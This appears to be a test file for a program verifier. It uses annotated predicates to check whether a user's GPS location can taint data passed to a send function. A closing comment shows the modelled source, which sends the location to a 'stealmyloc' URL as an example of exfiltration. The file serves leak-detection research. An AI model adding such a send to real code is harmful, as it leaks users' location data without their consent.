data location{int info;}
data cell{location loc;}

pred_prim annc<c:cell,b:bool>;
pred_prim annl<c:location,b:bool>;

location getGPSLocation()
  requires true
  ensures  res::location<_> * res::annl<_,false>;
//  ensures  res::location<_> * res::annl<_,true>;

void send(location x, int location)
  requires x::annl<_,b> & !b
  ensures true;

void test_taint(cell d, bool R, int loc)
  requires d::cell<_> * d::annc<_,b> & !b
  ensures  true;
{
  location x = null;
  if(R) x = getGPSLocation();
  d.loc = x; 
  dprint;
  if(R) send(d.loc, loc);
}

/*
Data d = new Data();
Location x = null;
if(R) x = getGPSLocation();
d.loc = x ;
if(R) send(d.loc, "http://xue.com/stealmyloc.php");
*/
